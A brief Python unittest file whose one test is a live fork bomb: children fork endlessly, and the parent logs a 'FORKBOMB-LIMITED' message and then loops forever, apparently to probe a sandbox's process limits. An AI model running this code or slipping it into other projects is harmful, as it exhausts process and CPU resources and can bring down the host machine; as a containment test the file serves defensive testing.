import os
import unittest


class ForkBombTest(unittest.TestCase):
    def test_fork_bomb(self):
        children = 0
        try:
            for _ in range(10_000):
                pid = os.fork()
                if pid == 0:
                    while True:
                        try:
                            os.fork()
                        except OSError:
                            pass
                children += 1
        except OSError as exc:
            print(f"FORKBOMB-LIMITED after {children} children: {exc.errno}", flush=True)
        while True:
            pass
